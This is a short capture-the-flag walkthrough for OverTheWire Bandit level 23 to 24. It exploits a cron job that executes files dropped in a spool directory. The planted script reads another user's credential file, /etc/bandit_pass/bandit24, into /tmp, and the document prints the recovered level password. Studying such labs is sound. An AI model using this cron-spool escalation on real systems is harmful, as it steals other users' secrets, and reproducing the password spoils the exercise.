# OverTheWire Bandit: Level 23 → 24 Notes

## 🛠️ Bandit Level 23 → Level 24

### Goal
Retrieve the password for `bandit24` by exploiting a cron job that executes scripts in `/var/spool/bandit24/foo`.

### Analysis
1.  **Inspect Cron Job**:
    ```bash
    cat /etc/cron.d/cronjob_bandit24
    ```
    Output:
    ```
    @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    ```

2.  **Analyze the Script**:
    The script `/usr/bin/cronjob_bandit24.sh` performs the following:
    - Changes directory to `/var/spool/bandit24/foo`.
    - Iterates through all files.
    - If a file is owned by `bandit23`, it executes it using `timeout`.
    - Deletes the file after handling it.

### Final Successful Execution
1.  **Navigate to a writable directory**:
    ```bash
    cd /tmp/dean
    ```

2.  **Create the script**:
    ```bash
    echo "cat /etc/bandit_pass/bandit24 > /tmp/dean/pass.txt" > /tmp/dean/sol.sh
    chmod 777 /tmp/dean/sol.sh
    ```

3.  **Copy to the spool directory**:
    ```bash
    cp /tmp/dean/sol.sh /var/spool/bandit24/foo/sol.sh
    ```

4.  **Wait for the cron job** and read the password:
    ```bash
    sleep 60 && cat /tmp/dean/pass.txt
    ```

### Password Retrieved
**bandit24**: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
